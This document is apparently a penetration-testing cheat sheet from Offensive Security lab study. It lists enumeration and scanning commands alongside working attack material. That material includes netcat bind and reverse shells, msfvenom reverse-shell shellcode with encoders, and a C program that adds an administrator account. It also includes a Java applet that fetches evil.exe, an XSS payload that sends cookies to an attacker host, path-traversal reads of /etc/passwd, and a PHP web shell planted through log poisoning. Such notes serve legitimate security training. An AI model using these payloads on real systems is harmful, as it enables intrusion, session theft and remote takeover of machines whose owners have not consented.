# LINUX/UNIX standard



1. enum active
   1. scan for ips
   2. do dns zone transfers
2. enum passive 
   1. database tools
3. scan for smb
   1. null sessions
   2. exploits
4. scan for smtp
   1. verify mails
5. scan for snmp
6. scan for vulnerabilities
   1.  /usr/share/nmap/scripts
7. scan for anonymous ftp servers



## locate

```bash

updatedb
locate *.exe
```



## which searches in $PATH

```bash
which nmap
```



## find

```bash
find / -name blah*
```



## services

### start

```bash
systemctl start ssh
```

### activate on boot

```bash 
systemctl enable ssh
```

* rcconf

* sysv-rc-conf



## netstat

```bash
netstat -antp|grep sshd
```



## HTTP Service

```bash
systemctl start apache2
```



## head

## wc



## grep

**negative grep**

```bash
grep -v
```



# Networking

## Netcat

**connect**

```bash
nc -nv 10.0.0.22 110
```

**listen**

```bash
nc -nlvp 4444
```

**file transfer**

*on receiving end*

```bash
nc -nlvp 4444 > incoming.exe
```

*on sending end*

```bash
nc -nv 10.0.0.22 4444 < /usr/share/windows-binaries/wget.exe
```

**shellz**

```bash
nc -nlvp 4444 -e cmd.exe
```

**reverse shellz**

*on hax0r host*

```bash
nc -nlvp 4444
```

*on pwned host*

```bash
nc -nv 10.0.0.22 4444 -e /bin/bash
```

## Rdesktop

mount windows-binaries folder to windows using rdesktop

```bash
rdesktop -r disk:share=/usr/share/windows-binaries -u offsec -p <password> 10.11.4.111 
```



## NCat

crypted shell only allowed to 10.0.0.4

*on pwned host*

```bash
ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
```

*on hax0r host*

```bash
ncat -v 10.0.0.22 4444 --ssl
```

## TCPDump

tcpdump read from pcap

```bash
tcpdump -r password_cracking_filtered.pcap
```

filtering 

```bash
tcpdump -n -r password_cracking_filtered.pcap |awk -F" " '{print $3}'| sort-u | head
```

filter for src host

```bash
tcpdump -n -r password_cracking_filtered.pcap src host <IP>
```

filter for dst host

```bash
tcpdump -n -r password_cracking_filtered.pcap dst host <IP>
```

filter for port

```bash
tcpdump -n -r password_cracking_filtered.pcap port <PORT>
```

show packet data in hex

```bash
tcpdump -X
```

filter for tcp flags (byte 14 in tcp)

ACK+PUSH flag -> 24

CEUAPRSF
00011000  = 24 in decimal

```bash
tcpdump 'tcp[13] = <value>'
```

# Enumeration

## Passive

### Google

```
site:<domain>
site:<domain> -site:www.<domain>
intitle:""
inurl:""
```

### TheHarvester

```bash
theharvester -d <domain> -b google
theharvester -d <domain> -b linkedin
theharvester -d <domain> -b twitter
```

### Netcraft

```
http://searchdns.netcraft.com/
```

### Whois

```bash
whois <domain>
```

### Recon-ng

```bash
recon-ng
use recon/domain-contacts/whois_pocs
use recon/domains-hosts/google_site_web
use recon/hosts-hosts/ip_neighbor

set SOURCE <domain>
run
```

## Active

### Host

```bash
host -t ns <domain>
host -t mx <domain>
# zone transfer
host -l <domain> ns.<domain>
```

## BruteForce

```bash
for sub in $(cat sub_domain_list.txt);do host $sub.<domain>;done | grep -v "not found"
```

```bash
for ip in $(seq  155 190);do host -r 50.7.67.$ip;done | grep -v "not found"
```

## Zone Transfer

```bash
#/bin/bash
# Simple Zone Transfer Bash Script
# $1 is the first argument given after the bash script
# Check if argument was given, if not, print usage
if [ -z "$1" ]; then
	echo "[*] Simple Zone transfer script"
	echo "[*] Usage   : $0 <domain name> "
	exit 0
fi
# if argument was given, identify the DNS servers for the domain
for server in $(host -t ns $1 |cut -d" " -f4);do
	host -l $1 $server |grep "has address"
done
```

or

```bash
dnsrecon -d megacorpone.com -t axfr
```

or

```bash
dnsenum megacorone.com
```

## Nmap

ping sweep

```bash
root@kali:~# nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
root@kali:~# grep Up ping-sweep.txt |cut -d " " -f 2
```

top20 

```bash
nmap –sT –A --top-ports=20 10.11.1.1-254 –oG top-port-sweep.txt
```

os fingerprint

```bash
nmap -O <IP>
```

banner

```bash
nmap -sV -sT <IP>
```

smb discovery

```bash
nmap 10.0.0.19 --script smb-os-discovery.nse
```

zone transfer

```bash
nmap --script=dns-zone-transfer -p 53 ns.<domain>
```

more scripts

```bash
 /usr/share/nmap/scripts
```



Traffic monitoring with iptables

```bash
TARGET=<IP>
# montor inbound
iptables -I INPUT 1 -s $TARGET -j ACCEPT
# montor outbound
iptables -I OUTPUT 1 -s $TARGET -j ACCEPT
# reset counters
iptables -Z

# show counters
iptables -vn -L

```

## Samba

Ports TCP 139, 445 and UDP

### ntbscan

```bash
nbtscan -r 10.11.1.0/24
```

### enum4linux

```bash
enum4linux -a 10.11.1.227
```

## nmap

```bash
nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.22
```

```bash
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.201
```

# SMTP

Port 25

VRFY cmd checks if user email exists.

EXPN asks if server is a member of a mailing list.



# SNMP

http://publib.boulder.ibm.com/infocenter/pseries/v5r3/index.jsp?topic=/com.ibm.aix.progcomm/doc/progcomc/mib.htm

UDP Port 161

```bash
nmap -sU --open -p 161 <ip> 
```

**Common community strings** public, private, manager

```bash
onesixtyone -c <file with list of community strings> -i <file with list of ips>
```

```bash
snmpwalk -c public -v1 <IP>
```



# Metasploit

Shellcode generation

```bash
msfvenom -l payloads
```

windows reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c
```

windows unicode reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.30.5 LPORT=443 -f js_le -e generic/none
```



remove bad characters by using encoders for example shikata_ga_nai

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

for threaded servers use thread exit function not exit process:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
```

linux bind shell

```bash
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
```



Exploit pattern creation

```bash
pattern_create.rb -l <size>
```

```bash
pattern_offset.rb -l <size> -q <value>
```

```python
badchars = map(lambda x: chr(x),  list(xrange(256)) )
```

# Mona.py

Show modules and if they are affected by mitigations or not.

```python
!mona modules
```

Finding instructions in dll

```python
!mona find -s "\x90\x90" -m <dll.dll>
```

Check if address that points to searched instructions does not contain any badchars.



# Searching exploits

search exploitdb archive in kali

```bash
searchsploit slmail
```

# Compilers

compile windows code in kali using:

```bash
apt-get install mingw-w64
mingw
```



# Uploads

## TFTP 

### Serve

```bash
root@kali:~# mkdir /tftp
root@kali:~# atftpd --daemon --port 69 /tftp
root@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
```

### Load

```bash
tftp -i 10.11.0.5 get nc.exe
```



## FTP

### setup

```bash
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```

### Download from windows

```bash
C:\Users\offsec>echo open 10.11.0.5 21> ftp.txt
C:\Users\offsec>echo USER offsec>> ftp.txt
C:\Users\offsec>echo ftp>> ftp.txt
C:\Users\offsec>echo bin >> ftp.txt
C:\Users\offsec>echo GET nc.exe >> ftp.txt
C:\Users\offsec>echo bye >> ftp.txt
C:\Users\offsec>ftp–v -n-s:ftp.txt
```

### Download using VBS

```bash

```

### Download using PowerShell

```bash

```

### Download using debug.exe

copy code in hex and reassemble using debug.exe. 64k byte limit.

**convert pe file to bat file** 

```bash
wine exe2bat.exe nc.exe nc.txt
```

# Privilege Escalation

# By Exploit

* Check for vulnerable kernel/distribution version.

## By Python Exploit

```bash
python pyinstaller.py --onefile ms11-080.py
```



## By wrong permissions

### On windows

check for Everyone permissions

```bash
icacls *.exe
```

useradd.c:

```c
#include <stdlib.h>     /* system, NULL, EXIT_FAILURE */
int main ()
{
	int i;
	i=system ("net localgroup administrators low /add");
	return 0;
}
```

```bash
i686-w64-mingw32-gcc -o <exe_file_with_everyone_permission>.exe useradd.c
```

Replace file with everyone permissions with useradd code.



**check permissions for database credentials**

 # Client Attacks

## By Java Applet

```bash
javac Java.java
echo “Permissions: all-permissions” > /root/manifest.txt
jar cvf Java.jar Java.class
keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -orepass password123
jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar  SignedJava.jar Java.jar signapplet
cp Java.class SignedJava.jar /var/www/html/
```

```bash
echo '<applet width="1" height="1" id="Java Secure" code="Java.class" 
archive="SignedJava.jar"><param name="1" 
value="http://10.11.0.5:80/evil.exe"></applet>' > /var/www/html/java.html
```

```bash
cp /usr/share/windows-binaries/nc.exe /var/www/html/evil.exe
```

## Browser Extensions

* Cookie Manager
* Tamper Data

## Web Attacks

* XSS

  * try to inject javascript in form elements

    * try to inject iframe and surf attacker site:

      * ```html
        <iframe SRC="http://10.11.0.5/report" height = "0" width ="0"></iframe>
        ```

  * stealing cookies/session tokens

    * ```html
      <script>
      new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;</script>
      ```

    * listen on 10.11.0.5 and copy cookie to cookie+

  * file inclusion 

    * ```html
      blah.php?LANG=../../../../../../../../../../etc/passwd
      ```

  * file inclusion/execution

    * ```bash
      nc -nv 10.11.1.35 80
      (UNKNOWN) [10.11.1.35] 80 (http) open
      <?php echo shell_exec($_GET['cmd']);?>

      HTTP/1.1 400 Bad Request
      ```

    * ```html
      blah.php?LANG=../../../../../../../../../../bar/log/apache2/access.log%00
      ```

    * ​

